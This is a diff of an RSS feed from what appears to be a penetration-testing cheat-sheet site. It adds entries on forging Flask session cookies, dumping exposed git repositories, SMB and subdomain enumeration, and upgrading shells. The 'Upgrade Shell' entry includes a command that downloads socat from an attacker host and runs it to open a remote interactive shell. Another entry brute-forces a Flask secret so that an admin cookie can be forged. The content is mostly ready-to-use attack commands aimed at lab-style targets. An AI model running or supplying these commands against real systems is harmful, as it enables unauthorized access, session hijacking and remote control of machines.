@@ -50,6 +50,20 @@
       <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share Base64 Encoding (for small binary) # In target Windows [System.</description>
     </item>
     <item>
+      <title>Flask Cookie</title>
+      <link>https://tldrbins.github.io/flask_cookie/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/flask_cookie/</guid>
+      <description> Flask Cookie pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&amp;#34; # Brute force secret key flask-unsign --unsign --cookie &amp;#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&amp;#34; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;#34;{&amp;#39;logged_in&amp;#39;: True, &amp;#39;username&amp;#39;: &amp;#39;admin&amp;#39;}&amp;#34; --secret &amp;#34;secret123&amp;#34; </description>
+    </item>
+    <item>
+      <title>git</title>
+      <link>https://tldrbins.github.io/git/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/git/</guid>
+      <description> Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;#39;branch_name&amp;#39; --oneline # Show diff, a and b are commit hash # a is older commit git diff [a] [b] # Show commit git show &amp;#39;commit_hash&amp;#39; git-dumper Download git-dumper&#xA;git-dumper http://10.10.11.10/.git result/ </description>
+    </item>
+    <item>
       <title>Java Environment</title>
       <link>https://tldrbins.github.io/java_envionment/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -166,7 +180,7 @@
       <link>https://tldrbins.github.io/smb_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/smb_enum/</guid>
-      <description>SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 smbmap -H 10.10.11.10 -u null smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * Login with password smbclient -L \\\\10.10.11.10\\ -U domain/username%password #After found an accessible share smbclient \\\\10.10.11.10\\share\\ -U domain/username%password Mount SMB Share sudo mount -t cifs &amp;#34;//10.</description>
+      <description>SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 --no-banner smbmap -H 10.10.11.10 --no-banner -u null # List known share smbmap -H 10.10.11.10 --no-banner -r &amp;#39;share&amp;#39; smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * Login with password smbmap smbmap -H 10.10.11.10 -u username -p password # List known share smbmap -H 10.</description>
     </item>
     <item>
       <title>SMB Server</title>
@@ -187,7 +201,14 @@
       <link>https://tldrbins.github.io/subdomain_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/subdomain_enum/</guid>
-      <description> wfuzz download wfuzz&#xA;# HTTP wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com # HTTPS wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u https://example.com -k Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com --hw 10 </description>
+      <description> wfuzz download wfuzz&#xA;# HTTP wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com # HTTPS wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u https://example.com -k Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com --hw 10 gobuster gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://example.com Add domain/subdomain to /etc/hosts echo &amp;#34;10.10.11.10 example.com&amp;#34; | sudo tee -a /etc/hosts </description>
+    </item>
+    <item>
+      <title>Upgrade Shell</title>
+      <link>https://tldrbins.github.io/upgrade_shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/upgrade_shell/</guid>
+      <description>Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; #Ctrl-Z to send the process to background stty raw -echo; fg #After fg, press enter again export TERM=xterm-256color socat Download socat&#xA;# Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.10.14.10/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:10.</description>
     </item>
     <item>
       <title>Web Directory Enum</title>
